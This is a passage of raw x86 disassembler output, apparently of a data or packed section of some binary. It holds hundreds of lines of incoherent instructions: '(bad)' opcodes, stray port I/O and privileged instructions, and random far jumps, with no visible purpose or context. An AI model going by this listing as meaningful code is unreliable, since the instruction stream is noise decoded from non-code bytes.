  423431:	popf   
  423432:	xor    ch,0x12
  423435:	xchg   ecx,edx
  423437:	push   ss
  423438:	jno    0x4233d2
  42343a:	dec    edi
  42343b:	(bad)  
  42343c:	outs   dx,DWORD PTR ds:[esi]
  42343d:	into   
  42343e:	mov    al,0x47
  423440:	dec    edi
  423441:	or     cl,ah
  423443:	outs   dx,BYTE PTR ds:[esi]
  423444:	xchg   ecx,eax
  423445:	mov    al,0x55
  423447:	jmp    0xa06f38f
  42344c:	adc    DWORD PTR [ebp-0x6c0694b3],edi
  423452:	adc    BYTE PTR [esi+0x3f],ch
  423455:	adc    BYTE PTR [ebp-0x221d0a5b],bl
  42345b:	dec    edi
  42345c:	push   0x58
  42345e:	mov    cl,0x39
  423460:	test   ah,ch
  423462:	push   esp
  423463:	ja     0x4234d7
  423465:	les    edi,FWORD PTR ds:0xcc793362
  42346b:	pop    edi
  42346c:	or     DWORD PTR [ebx+ebp*2],ebp
  42346f:	lea    ebx,[eax-0x4515d621]
  423475:	push   esp
  423476:	fwait
  423477:	add    ah,BYTE PTR [esi-0x74214cea]
  42347d:	push   esi
  42347e:	imul   edx,DWORD PTR [ecx],0x21
  423481:	push   ecx
  423482:	ret    0xce37
  423485:	popa   
  423486:	inc    eax
  423487:	and    dl,BYTE PTR [eax-0x619eb2a]
  42348d:	pop    eax
  42348e:	cld    
  42348f:	mov    edx,0x6b40410f
  423494:	push   esi
  423495:	jecxz  0x423451
  423497:	add    eax,DWORD PTR [ebx+0xd4]
	...
  423511:	add    BYTE PTR [eax],al
  423513:	add    dl,dl
  423515:	in     al,dx
  423516:	and    edx,DWORD PTR [ecx]
  423518:	aas    
  423519:	fcomip st,st(2)
  42351b:	out    dx,eax
  42351c:	or     DWORD PTR [esi+0x1477eacd],ebp
  423522:	cs popf 
  423524:	aad    0xca
  423526:	add    DWORD PTR [eax],eax
  423528:	outs   dx,BYTE PTR ds:[esi]
  423529:	pop    es
  42352a:	add    BYTE PTR [eax],al
  42352c:	cwde   
  42352d:	add    ebx,DWORD PTR [edx]
  42352f:	pop    esi
  423530:	mov    ds:0x7703c0e2,eax
  423535:	sbb    al,0xfb
  423537:	dec    eax
  423538:	hlt    
  423539:	ror    BYTE PTR [edx-0x40],0x80
  42353d:	cmp    BYTE PTR [edi-0x2d0e3bcc],0xe6
  423544:	nop
  423545:	sahf   
  423546:	inc    eax
  423547:	mov    esi,0x1d89076a
  42354c:	retf   
  42354d:	xor    edx,DWORD PTR [eax-0x33]
  423550:	mov    ebp,0xd98db0e3
  423555:	iret   
  423556:	jb     0x42350b
  423558:	fcmovnb st,st(4)
  42355a:	(bad)  [esi+ebx*1-0x31e10227]
  423561:	in     eax,dx
  423562:	sub    BYTE PTR [ecx],ch
  423564:	sbb    ah,cl
  423566:	adc    DWORD PTR [ebx-0x73114e4c],ebp
  42356c:	scas   eax,DWORD PTR es:[edi]
  42356d:	and    BYTE PTR [ecx+0xadd7e6],dl
  423573:	mov    esp,0xca61cc25
  423578:	or     eax,0xdace7e4a
  42357d:	call   0xa6220cec
  423582:	mul    ebp
  423584:	fistp  WORD PTR [edi]
  423586:	(bad)  [eax+0x16bbe317]
  42358c:	test   DWORD PTR [eax+ebx*8],0x8f5f8ea5
  423593:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423595:	push   cs
  423596:	lahf   
  423597:	and    BYTE PTR [edx-0x378e8885],dh
  42359d:	cs inc edi
  42359f:	dec    ecx
  4235a0:	add    edx,DWORD PTR [edx-0x3c]
  4235a3:	adc    dh,bl
  4235a5:	dec    edx
  4235a6:	gs test eax,0x1dcfd22c
  4235ac:	test   DWORD PTR [ebx],esp
  4235ae:	rcr    DWORD PTR [ebx],1
  4235b0:	cmp    eax,ebx
  4235b2:	mov    ecx,0xe0bc8f49
  4235b7:	stos   BYTE PTR es:[edi],al
  4235b8:	test   DWORD PTR [ecx-0x24],0x6e54877d
  4235bf:	add    BYTE PTR [edi-0xb],bh
  4235c2:	cmp    DWORD PTR [esp+edi*4],ebx
  4235c5:	pop    eax
  4235c6:	xor    DWORD PTR [edi],eax
  4235c8:	mov    esp,0xea83e52c
  4235cd:	mov    WORD PTR [edx],cs
  4235cf:	jmp    0x423587
  4235d1:	and    al,0xbc
  4235d3:	imul   BYTE PTR [ebx+0x6]
  4235d6:	jmp    0xb7f:0x997acb8c
  4235dd:	clts   
  4235df:	adc    al,0x6c
  4235e1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4235e3:	scas   al,BYTE PTR es:[edi]
  4235e4:	and    esp,DWORD PTR [edi]
  4235e6:	xor    esi,esi
  4235e8:	test   DWORD PTR [ebx+0x43b06f74],ebp
  4235ee:	sbb    al,BYTE PTR [ebx-0x59]
  4235f1:	retf   
  4235f2:	inc    ebx
  4235f3:	sub    DWORD PTR [ebx+0x52],0x55
  4235f7:	(bad)  [ecx+ebx*2]
  4235fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235fb:	cmc    
  4235fc:	pop    es
  4235fd:	mov    edi,0xee9ad48a
  423602:	pusha  
  423603:	nop
  423604:	mov    edx,0x113dd168
  423609:	ret    0xa5bd
  42360c:	jns    0x42365d
  42360e:	mov    ebx,0x31ebf6f9
  423613:	dec    esi
  423614:	ss shr bh,1
  423617:	aas    
  423618:	xor    eax,0x779e520b
  42361d:	loop   0x4235f7
  42361f:	xchg   BYTE PTR [edx-0x4c],dl
  423622:	cmp    ch,0x32
  423625:	(bad)  [ecx+ecx*2+0x7196e7dc]
  42362c:	inc    DWORD PTR [edx-0x5d534d71]
  423632:	xchg   ecx,eax
  423633:	and    edi,eax
  423635:	pop    ebp
  423636:	jmp    0x16b6101d
  42363b:	(bad)  
  42363c:	pop    esp
  42363d:	mov    eax,ds:0x74abb518
  423642:	push   0x1892d2e9
  423647:	sti    
  423648:	shl    DWORD PTR [eax*8+0x159f3395],cl
  42364f:	mov    WORD PTR [ebp+0xa],?
  423652:	loope  0x423644
  423654:	aad    0x93
  423656:	pop    edx
  423657:	jb     0x4235e8
  423659:	in     al,dx
  42365a:	ja     0x42369d
  42365c:	pop    edi
  42365d:	les    esp,FWORD PTR [esi+0x53]
  423660:	icebp  
  423661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423662:	in     al,0x2
  423664:	lahf   
  423665:	sub    BYTE PTR [ebx+eiz*2-0x30],dl
  423669:	test   BYTE PTR [edi-0x581cf820],0x6a
  423670:	mov    edx,0x7d55613b
  423675:	mov    cl,0xe9
  423677:	fwait
  423678:	jae    0x4236f4
  42367a:	pop    ecx
  42367b:	add    ebp,DWORD PTR [esi+0x1d]
  42367e:	or     esp,DWORD PTR [eax+eiz*8+0x6]
  423682:	cmp    eax,0x851024ff
  423687:	iret   
  423688:	dec    ebx
  423689:	xor    al,0x28
  42368b:	test   BYTE PTR [esp+edx*8],ch
  42368e:	push   eax
  42368f:	je     0x42370b
  423691:	mov    ebx,0x58969b64
  423696:	fiadd  WORD PTR [ecx+0x4697df78]
  42369c:	loop   0x42368b
  42369e:	cs out dx,al
  4236a0:	pop    ds
  4236a1:	lea    ebp,[esi]
  4236a3:	lock iret 
  4236a5:	mov    edx,0x648f53bb
  4236aa:	pusha  
  4236ab:	add    BYTE PTR [eax],0xe1
  4236ae:	mov    ds:0x345d0972,al
  4236b3:	push   edi
  4236b4:	mov    bl,0x26
  4236b6:	out    0x53,eax
  4236b8:	jae    0x4236fe
  4236ba:	xlat   BYTE PTR ds:[ebx]
  4236bb:	popa   
  4236bc:	push   ds
  4236bd:	xor    ah,cl
  4236bf:	mov    ebx,0x99e714c9
  4236c4:	sbb    BYTE PTR [esi+0x65feb732],cl
  4236ca:	jno    0x42369f
  4236cc:	xchg   esp,eax
  4236cd:	adc    edx,DWORD PTR [esi-0x73]
  4236d0:	addr16 pop eax
  4236d2:	mov    edx,0xfc02ba1e
  4236d7:	lock xchg ch,al
  4236da:	pop    ebx
  4236db:	ror    ebx,1
  4236dd:	retf   
  4236de:	mov    eax,0xa4142297
  4236e3:	push   0xffffff86
  4236e5:	pop    edx
  4236e6:	aad    0x5e
  4236e8:	lahf   
  4236e9:	mov    eax,eax
  4236eb:	arpl   WORD PTR [ecx],di
  4236ed:	add    ebx,DWORD PTR [ebx-0x7a]
  4236f0:	mov    eax,ds:0x6e87ddc6
  4236f5:	aas    
  4236f6:	enter  0xa698,0xb3
  4236fa:	lahf   
  4236fb:	jne    0x42374d
  4236fd:	mov    al,ds:0xd98ed720
  423702:	xchg   DWORD PTR [ebx],esi
  423704:	ror    bl,1
  423706:	arpl   dx,si
  423708:	cmp    DWORD PTR [ecx],ebx
  42370a:	push   0xffffffbb
  42370c:	sbb    ch,bl
  42370e:	add    DWORD PTR [ebx-0x1e],edx
  423711:	in     al,dx
  423712:	pushf  
  423713:	bnd jl 0x42370a
  423716:	xor    BYTE PTR [ecx],dl
  423718:	in     al,dx
  423719:	mov    BYTE PTR [ecx-0x4d29d5ee],ch
  42371f:	jle    0x4236c0
  423721:	pop    eax
  423722:	sbb    DWORD PTR [esi],ebx
  423724:	retf   0x136f
  423727:	cld    
  423728:	imul   edx,DWORD PTR [ebp+0x72],0xfffffff6
  42372c:	stos   BYTE PTR es:[edi],al
  42372d:	pop    ebp
  42372e:	mov    cl,0x66
  423730:	xor    ah,BYTE PTR [edx+0x58]
  423733:	jecxz  0x423736
  423735:	fcmovb st,st(3)
  423737:	or     al,0xbb
  423739:	dec    ebx
  42373a:	repz inc ecx
  42373c:	push   ebp
  42373d:	lods   eax,DWORD PTR ds:[esi]
  42373e:	and    ecx,ecx
  423740:	stos   BYTE PTR es:[edi],al
  423741:	mov    edi,0x1d1e5e5b
  423746:	xor    dl,bl
  423748:	mov    dh,0xb2
  42374a:	xchg   edi,eax
  42374b:	or     al,0x7a
  42374d:	fwait
  42374e:	and    al,0x3
  423750:	inc    esp
  423751:	shl    DWORD PTR [esi-0x50085b2],0x6f
  423758:	adc    DWORD PTR [eax+0x35ff10ce],0xfda77f2a
  423762:	sub    dh,BYTE PTR [edi-0x1d]
  423765:	out    0xb4,al
  423767:	mov    edx,0x4561eb14
  42376c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42376d:	test   bl,ah
  42376f:	mov    al,dl
  423771:	sub    dl,BYTE PTR [edx+edx*8]
  423774:	sub    al,0x83
  423776:	jle    0x42372a
  423778:	xor    al,0x9
  42377a:	adc    ecx,DWORD PTR [ebx+0x7cf1a1f9]
  423780:	lods   al,BYTE PTR ds:[esi]
  423781:	imul   ebp,DWORD PTR [esi],0xde3e1f68
  423787:	je     0xfca1857a
  42378d:	or     ch,BYTE PTR [ecx+eax*2+0x59520db6]
  423794:	cwde   
  423795:	xor    DWORD PTR [edx-0x2b38e02e],esi
  42379b:	add    BYTE PTR [eax-0x5903ec1e],ch
  4237a1:	jp     0x42377c
  4237a3:	jbe    0x4237ac
  4237a5:	adc    DWORD PTR cs:[edx],esp
  4237a8:	stos   DWORD PTR es:[edi],eax
  4237a9:	inc    edi
  4237aa:	jecxz  0x4237e0
  4237ac:	adc    edi,edi
  4237ae:	popf   
  4237af:	in     al,dx
  4237b0:	push   esi
  4237b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237b2:	ss pusha 
  4237b4:	jecxz  0x4237d6
  4237b6:	mov    ebp,0x4fa4e09
  4237bb:	jp     0x423811
  4237bd:	inc    BYTE PTR [edi+ebp*8]
  4237c0:	and    BYTE PTR [ecx-0x22266d7d],al
  4237c6:	loopne 0x423753
  4237c8:	or     BYTE PTR [ebp+0x295c1a23],ch
  4237ce:	jp     0x423783
  4237d0:	or     BYTE PTR [ebp+0x3d],dl
  4237d3:	dec    ebp
  4237d4:	shl    ebp,cl
  4237d6:	or     DWORD PTR [ecx],eax
  4237d8:	dec    eax
  4237d9:	and    DWORD PTR [esi],0xd63d81f
  4237df:	out    0xc7,eax
  4237e1:	stos   DWORD PTR es:[edi],eax
  4237e2:	add    DWORD PTR [edi-0x33],eax
  4237e5:	pop    ebp
  4237e6:	mov    eax,ds:0x40132cb5
  4237eb:	not    edx
  4237ed:	xchg   ebx,eax
  4237ee:	aad    0x6a
  4237f0:	mov    esp,DWORD PTR [ecx-0x78120fa2]
  4237f6:	fld    TBYTE PTR [edx-0x19]
  4237f9:	shr    DWORD PTR [edi-0x30],1
  4237fc:	xor    eax,0x9a663405
  423802:	and    DWORD PTR [ebx-0x5],0x91db7467
  423809:	xor    DWORD PTR [edi+0x15],esp
  42380c:	es xchg ecx,eax
  42380e:	fild   DWORD PTR [ecx-0x1cd294c0]
  423814:	push   es
  423815:	dec    edi
  423816:	punpckhwd mm6,QWORD PTR [edx-0x4c]
  42381a:	(bad)  
  42381b:	loope  0x423837
  42381d:	scas   eax,DWORD PTR es:[edi]
  42381e:	std    
  42381f:	mov    ch,0x46
  423821:	cmp    esp,esi
  423823:	jae    0x42389c
  423825:	gs aaa 
  423827:	les    ecx,FWORD PTR [esi]
  423829:	sub    bl,bh
  42382b:	outs   dx,DWORD PTR ds:[esi]
  42382c:	(bad)  [edx]
  42382e:	cmp    al,0xac
  423830:	outs   dx,BYTE PTR ds:[esi]
  423831:	sub    ebx,DWORD PTR [esi-0x6b1b741d]
  423837:	cdq    
  423838:	mov    ebx,0x6eb894b
  42383d:	nop
  42383e:	jle    0x423886
  423840:	or     al,0x11
  423842:	push   eax
  423843:	add    eax,0x10b2d87e
  423848:	daa    
  423849:	add    ch,BYTE PTR [edi+0x5b]
  42384c:	and    DWORD PTR [edi-0x4],eax
  42384f:	mov    cs,WORD PTR [ebx+0x204cb3c0]
  423855:	int3   
  423856:	mov    esi,0xc2218ce3
  42385b:	jle    0x4238d1
  42385d:	cwde   
  42385e:	mov    ecx,0xb1ab2e9c
  423863:	test   eax,0xffce01eb
  423868:	pushf  
  423869:	dec    esi
  42386a:	jns    0x423800
  42386c:	sar    DWORD PTR [edi+eax*8],cl
  42386f:	imul   edi,DWORD PTR [ecx-0x56],0x52b84353
  423876:	mov    bl,0xf6
  423878:	jg     0x4238c4
  42387a:	mov    WORD PTR [ecx-0x68],ss
  42387d:	push   es
  42387e:	adc    BYTE PTR [eax-0x5ce5b9d],al
  423884:	in     al,dx
  423885:	jo     0x4238a7
  423887:	enter  0x68e4,0x5b
  42388b:	int3   
  42388c:	adc    al,0x36
  42388e:	and    BYTE PTR [eax+edx*2],bl
  423891:	and    ecx,DWORD PTR [edx+0x79]
  423894:	je     0x4238c6
  423896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423897:	dec    ecx
  423898:	dec    edx
  423899:	(bad)  
  42389a:	jmp    0x423885
  42389c:	cmp    al,0xe1
  42389e:	aas    
  42389f:	xchg   edi,eax
  4238a0:	add    eax,0x51eeb7e6
  4238a5:	fs test esp,esp
  4238a8:	sbb    al,0xda
  4238aa:	mov    ah,0x62
  4238ac:	mul    bl
  4238ae:	dec    eax
  4238af:	or     al,0xd6
  4238b1:	or     al,BYTE PTR [esi+0x59]
  4238b4:	pusha  
  4238b5:	fwait
  4238b6:	js     0x4238bf
  4238b8:	repnz sub al,0xcf
  4238bb:	mov    ebx,ss
  4238bd:	xor    ah,0x55
  4238c0:	or     DWORD PTR [edi+edi*8],0xb0012a5d
  4238c7:	mov    ds:0x6d5b8343,eax
  4238cc:	adc    eax,0xe466d656
  4238d1:	pop    es
  4238d2:	and    ebp,DWORD PTR [ebx+0x1c]
  4238d5:	push   ss
  4238d6:	pop    edi
  4238d7:	sbb    BYTE PTR [eax],al
  4238d9:	jecxz  0x423903
  4238db:	mov    ebx,0x8fa591df
  4238e0:	dec    ebx
  4238e1:	push   0xf0d5d85d
  4238e6:	adc    eax,0x4ccd8edb
  4238eb:	or     al,0x94
  4238ed:	ss fsubr st(2),st
  4238f0:	icebp  
  4238f1:	hlt    
  4238f2:	inc    ebx
  4238f3:	xor    ebx,esi
  4238f5:	fdiv   QWORD PTR [esi-0x10413154]
  4238fb:	pop    es
  4238fc:	scas   eax,DWORD PTR es:[edi]
  4238fd:	mov    ebx,DWORD PTR [ebp-0x491f957b]
  423903:	pop    ebx
  423905:	fadd   QWORD PTR [ebx+0x158951b2]
  42390b:	pop    esp
  42390c:	or     BYTE PTR [edx+0x66],0xcc
  423910:	adc    ch,BYTE PTR ds:0x52a615
  423917:	iret   
  423918:	fdivr  st(5),st
  42391a:	dec    ebx
  42391b:	out    dx,eax
  42391c:	test   al,0x5c
  42391e:	mov    edi,0x5fb19fdb
  423923:	aaa    
  423924:	dec    eax
  423925:	cmp    ecx,edi
  423927:	test   DWORD PTR [ecx],edi
  423929:	push   eax
  42392a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42392b:	inc    ebx
  42392c:	xchg   ebp,eax
  42392d:	and    DWORD PTR [edi+0x10],ebp
  423930:	mov    dh,0xa
  423932:	retf   
  423933:	scas   al,BYTE PTR es:[edi]
  423934:	rcr    DWORD PTR [ebp-0x601f28bf],0x83
  42393b:	out    0xff,al
  42393d:	pop    ss
  42393e:	fneni(8087 only) 
  423940:	push   ecx
  423941:	xchg   ebp,eax
  423942:	or     eax,0x890fd5cc
  423947:	dec    ebp
  423948:	mov    bh,0xd0
  42394a:	in     eax,0x76
  42394c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42394d:	test   BYTE PTR [ebp+0x2a365f37],bl
  423953:	gs call 0x851b0d86
  423959:	or     ch,al
  42395b:	lods   al,BYTE PTR ds:[esi]
  42395c:	fbstp  TBYTE PTR [edi+0x36]
  42395f:	popa   
  423960:	and    bl,BYTE PTR [ebx]
  423962:	loop   0x423922
  423964:	mov    al,ds:0x69b8c09c
  423969:	clc    
  42396a:	jl     0x4239a4
  42396c:	mov    cl,0x6d
  42396e:	cwde   
  42396f:	push   edx
  423970:	sub    bl,BYTE PTR [esp+esi*2+0x17]
  423974:	jp     0x423945
  423976:	push   ds
  423977:	clc    
  423978:	and    eax,0xb7c375a
  42397d:	xor    al,0xe9
  42397f:	cmc    
  423980:	mov    bh,0x82
  423982:	jle    0x423971
  423984:	adc    ebp,ebp
  423986:	test   eax,0xdee657c7
  42398b:	adc    eax,0x539081dd
  423990:	std    
  423991:	or     DWORD PTR ds:[ebx+0x66],0xffffffb9
  423996:	mov    dl,0x8d
  423998:	pop    ebx
  423999:	ror    BYTE PTR [ebp+0x61],1
  42399c:	cmp    ecx,DWORD PTR [ecx-0x127c191e]
  4239a2:	sahf   
  4239a3:	push   0xffffffb4
  4239a5:	or     DWORD PTR ds:0xebee0f18,ebx
  4239ab:	cmp    DWORD PTR [edi+eiz*8],ecx
  4239ae:	jbe    0x4239da
  4239b0:	inc    esp
  4239b1:	lahf   
  4239b2:	fistp  QWORD PTR [eax]
  4239b4:	cdq    
  4239b5:	dec    ebp
  4239b6:	inc    edx
  4239b7:	jae    0x423943
  4239b9:	test   eax,0x6a1e40c8
  4239be:	call   0x57e7:0x368d872a
  4239c5:	les    edi,FWORD PTR [edi+0x4f9adddb]
  4239cb:	js     0x4239f4
  4239cd:	push   edi
  4239ce:	js     0x423a32
  4239d0:	sar    BYTE PTR [edx+0x21],1
  4239d3:	ja     0x4239dd
  4239d5:	jmp    0x2f51:0xcdae89a1
  4239dc:	(bad)  
  4239dd:	xor    bh,ch
  4239df:	mov    BYTE PTR [ecx],cl
  4239e1:	xlat   BYTE PTR ds:[ebx]
  4239e2:	mov    ebx,0x50b5e315
  4239e7:	ins    BYTE PTR es:[edi],dx
  4239e8:	mov    ebx,0x5935fafd
  4239ed:	push   eax
  4239ee:	mov    al,0x70
  4239f0:	lock inc esi
  4239f2:	lea    esp,[ecx+0xb]
  4239f5:	call   0xccf8:0x872e3aa6
  4239fc:	lods   al,BYTE PTR ds:[esi]
  4239fd:	jl     0x423a69
  4239ff:	pop    ds
  423a00:	jmp    0xd3deb748
  423a05:	in     al,dx
  423a06:	inc    ebx
  423a07:	mov    edx,0xad78c51
  423a0c:	push   ss
  423a0d:	jg     0x423a76
  423a0f:	call   FWORD PTR [eax-0x59944f35]
  423a15:	and    eax,0x9ce998c5
  423a1a:	cdq    
  423a1b:	mov    bl,0x74
  423a1d:	repnz sbb ah,0xb5
  423a21:	or     ebx,DWORD PTR [ecx]
  423a23:	mov    ebx,0xc7f86b90
  423a28:	push   es
  423a29:	cmp    al,0x78
  423a2b:	jge    0x4239d4
  423a2d:	popa   
  423a2e:	sahf   
  423a2f:	jp     0x4239c9
  423a31:	jle    0x423a87
  423a33:	fisubr DWORD PTR [ecx-0x7]
  423a36:	aam    0xa5
  423a38:	rol    BYTE PTR ds:[esi],cl
  423a3b:	dec    ecx
  423a3c:	mov    ds:0x3ab5e6c3,eax
  423a41:	mov    bh,0x1f
  423a43:	pop    ebp
  423a44:	addr16 xchg ebp,eax
  423a46:	dec    ecx
  423a47:	call   FWORD PTR [edi+0x114116f1]
  423a4d:	stos   DWORD PTR es:[edi],eax
  423a4e:	retf   
  423a4f:	lock pop esi
  423a51:	inc    ebx
  423a52:	jae    0x423a45
  423a54:	jmp    0x423aa1
  423a56:	xor    edx,DWORD PTR [edi+0x2a]
  423a59:	daa    
  423a5a:	push   ds
  423a5b:	out    dx,eax
  423a5c:	sub    edx,ecx
  423a5e:	or     dl,dl
  423a60:	jno    0x423ad3
  423a62:	(bad)  [ecx+0x43]
  423a65:	aam    0xad
  423a67:	xchg   DWORD PTR [ebp-0x37],ecx
  423a6a:	jp     0x423ac8
  423a6c:	ja     0x423a2e
  423a6e:	add    cl,al
  423a70:	iret   
  423a71:	mov    ah,0x47
  423a73:	sub    bl,cl
  423a75:	jmp    edx
  423a77:	inc    ebx
  423a78:	(bad)  
  423a7a:	push   edx
  423a7b:	test   al,0xf
  423a7d:	or     eax,0xaa66a35d
  423a82:	mov    cl,BYTE PTR [esi]
  423a84:	mov    dl,0x3
  423a86:	adc    DWORD PTR [edi-0x424eefaf],0x83b93638
  423a90:	fcmovbe st,st(7)
  423a92:	push   ecx
  423a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a94:	jne    0x423a94
  423a96:	sub    cl,ch
  423a98:	lock or bl,dh
  423a9b:	ret    0xee14
  423a9e:	rcr    DWORD PTR [eax+0x3f],cl
  423aa1:	sahf   
  423aa2:	jo     0x423aa6
  423aa4:	xor    eax,0x694f91ca
  423aa9:	sahf   
  423aaa:	jl     0x423b12
  423aac:	cwde   
  423aad:	xchg   edx,eax
  423aae:	jne    0x423b25
  423ab0:	mov    ah,0x36
  423ab2:	jp     0x423ad5
  423ab4:	outs   dx,DWORD PTR ds:[esi]
  423ab5:	loope  0x423a9c
  423ab7:	push   edx
  423ab8:	xor    eax,0xda2f91fd
  423abd:	ss mov bl,0x9f
  423ac0:	stos   DWORD PTR es:[edi],eax
  423ac1:	xchg   ebx,eax
  423ac2:	hlt    
  423ac3:	jmp    0xa5a1:0x8f9f4579
  423aca:	mov    cl,0xed
  423acc:	loope  0x423a93
  423ace:	push   ecx
  423acf:	dec    ecx
  423ad0:	test   DWORD PTR [ebx+0x2eb20b75],esi
  423ad6:	imul   BYTE PTR [edx]
  423ad8:	jp     0x423b17
  423ada:	clc    
  423adb:	test   eax,0xc2732d73
  423ae0:	adc    esp,DWORD PTR [ebx+eiz*4-0x48c2f78f]
  423ae7:	ins    BYTE PTR es:[edi],dx
  423ae8:	push   0xfffffffb
  423aea:	stos   BYTE PTR es:[edi],al
  423aeb:	aam    0x31
  423aed:	ja     0x423b20
  423aef:	pop    esi
  423af0:	sub    al,0x9c
  423af2:	ja     0x423b73
  423af4:	mov    ebp,0x84857c7
  423af9:	pop    eax
  423afa:	call   DWORD PTR [eax-0x2a]
  423afd:	aam    0xca
  423aff:	mov    ecx,DWORD PTR [edx-0x20d8acfc]
  423b05:	ds mov ah,0xb6
  423b08:	sub    esp,DWORD PTR [ebp+0x4c870e69]
  423b0e:	js     0x423b5d
  423b10:	xor    DWORD PTR [ebx],0x86091285
  423b16:	repnz or esi,edx
  423b19:	cli    
  423b1a:	dec    ebx
  423b1b:	xchg   edx,eax
  423b1c:	and    DWORD PTR [ebp+0x42],ebx
  423b1f:	fisub  DWORD PTR [esi+0x52d3906a]
  423b25:	dec    esp
  423b26:	mov    WORD PTR [esi-0x4a1191a9],?
  423b2c:	in     al,dx
  423b2d:	mov    WORD PTR [ebx],gs
  423b2f:	iret   
  423b30:	sub    eax,0x62dea64e
  423b35:	fisubr DWORD PTR [edx+0x49]
  423b38:	pop    ebp
  423b39:	push   es
  423b3a:	in     eax,0x83
  423b3c:	add    al,0x94
  423b3e:	addr16 add eax,0x1ab4494e
  423b44:	sahf   
  423b45:	in     eax,0xd9
  423b47:	and    DWORD PTR [edi],0x5d72e229
  423b4d:	out    0xf1,eax
  423b4f:	inc    esp
  423b50:	sub    esi,esp
  423b52:	jecxz  0x423b03
  423b54:	xchg   esi,eax
  423b55:	jmp    0x10782aff
  423b5a:	sub    DWORD PTR [edx],ebx
  423b5c:	add    ch,BYTE PTR ds:0x7cf6a710
  423b62:	lds    ebx,FWORD PTR [edx+0x47]
  423b65:	jge    0x423bbc
  423b67:	dec    ebx
  423b68:	mov    al,0xec
  423b6a:	test   DWORD PTR [ecx-0x5ff73731],esi
  423b70:	nop
  423b71:	xchg   ecx,eax
  423b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b73:	jmp    0xc6c34add
  423b78:	add    bh,BYTE PTR [esi+0x4a]
  423b7b:	ins    DWORD PTR es:[edi],dx
  423b7c:	mov    edx,0x5e1ae997
  423b81:	mov    cl,0xaf
  423b83:	sbb    edx,eax
  423b85:	loop   0x423bbf
  423b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b88:	int    0xfa
  423b8a:	ss cli 
  423b8c:	cmp    al,0x35
  423b8e:	adc    ebx,DWORD PTR [ebx]
  423b90:	sbb    eax,0x233c4bb0
  423b95:	retf   0xb96f
  423b98:	in     eax,0x82
  423b9a:	mov    edx,0xed993c06
  423b9f:	cmp    eax,0xd28c1396
  423ba4:	inc    esp
  423ba5:	xlat   BYTE PTR ds:[ebx]
  423ba6:	lock sub DWORD PTR [edi],ecx
  423ba9:	(bad)  
  423bab:	repz cmp esi,DWORD PTR [edi+0x4480243d]
  423bb2:	cld    
  423bb3:	cmp    dl,0x33
  423bb6:	mov    ds:0x37695c9d,al
  423bbb:	lods   eax,DWORD PTR ds:[esi]
  423bbc:	iret   
  423bbd:	test   BYTE PTR ss:[esi-0xa2d80e],dh
  423bc4:	sahf   
  423bc5:	ret    0xd618
  423bc8:	add    al,0x91
  423bca:	adc    eax,0x52f97bdd
  423bcf:	xchg   esi,eax
  423bd0:	test   dl,0x9e
  423bd3:	sbb    ebp,DWORD PTR ds:0xe5f6cec
  423bd9:	aas    
  423bda:	mov    ds:0x81334472,eax
  423bdf:	xor    al,0x27
  423be1:	and    BYTE PTR [eax+0x55],cl
  423be4:	mov    eax,ds:0x8a62aa26
  423be9:	(bad)  
  423bea:	push   0x35568d62
  423bef:	inc    ecx
  423bf0:	xchg   edx,eax
  423bf1:	cwde   
  423bf2:	sqrtps xmm6,xmm3
  423bf5:	mov    DWORD PTR [edx-0x39365597],ecx
  423bfb:	fcom   DWORD PTR [eax]
  423bfe:	mov    fs,edx
  423c00:	arpl   sp,ax
  423c02:	cli    
  423c03:	retf   0x61c7
  423c06:	pop    ebx
  423c07:	test   al,0xb7
  423c09:	in     al,0xb6
  423c0b:	and    DWORD PTR [edi+0x7b0d584b],edi
  423c11:	xor    DWORD PTR [edx-0x56c9b98f],0x35
  423c18:	in     al,dx
  423c19:	cdq    
  423c1a:	mov    ch,0x95
  423c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c1d:	pop    es
  423c1e:	push   ebp
  423c1f:	sub    BYTE PTR [edx+edi*4+0x39],0xec
  423c24:	mov    ds:0xb4d925a9,al
  423c29:	dec    ebx
  423c2a:	push   0x5a
  423c2c:	inc    edi
  423c2d:	ss (bad) 
  423c2f:	mov    edx,0x7e3ca9dd
  423c34:	and    BYTE PTR [edx],dl
  423c36:	mov    dh,0xbc
  423c38:	test   dh,0xf2
  423c3b:	cmp    al,0x33
  423c3d:	cmp    eax,0x3930232
  423c42:	jb     0x423c35
  423c44:	aaa    
  423c45:	sub    bl,BYTE PTR [ebp-0xc]
  423c48:	mov    ebx,ds
  423c4a:	js     0x423c82
  423c4c:	fcmovnb st,st(3)
  423c4e:	sub    BYTE PTR [eax-0x65053efb],ah
  423c54:	arpl   cx,si
  423c56:	add    BYTE PTR [eax+0x9c7f6ac],0x4
  423c5d:	ficomp DWORD PTR [esi]
  423c5f:	test   BYTE PTR [esi+eax*2+0x53],0xa8
  423c64:	test   eax,0xf2b7eabd
  423c69:	mov    bl,0x27
  423c6b:	ss mov ebp,0x710e3b84
  423c71:	jl     0x423c78
  423c73:	pop    esp
  423c74:	loop   0x423c8b
  423c76:	inc    ebp
  423c77:	in     eax,dx
  423c78:	shr    ah,0x4b
  423c7b:	and    BYTE PTR [edi-0xb],0xe1
  423c7f:	bound  ecx,QWORD PTR [eax]
  423c81:	xchg   ebp,eax
  423c82:	jge    0x423c7b
  423c84:	outs   dx,BYTE PTR ds:[esi]
  423c85:	sbb    ecx,ebx
  423c87:	stos   BYTE PTR es:[edi],al
  423c88:	mov    al,ds:0xadccffad
  423c8d:	pop    edi
  423c8e:	adc    ah,al
  423c90:	add    dl,BYTE PTR [eax]
  423c92:	sbb    BYTE PTR [esi],ch
  423c94:	scas   al,BYTE PTR es:[edi]
  423c95:	loop   0x423c4e
  423c97:	mov    ds:0xf0b3,eax
	...
  423d14:	retf   0xe76a
  423d17:	ja     0x423d00
  423d19:	(bad)  
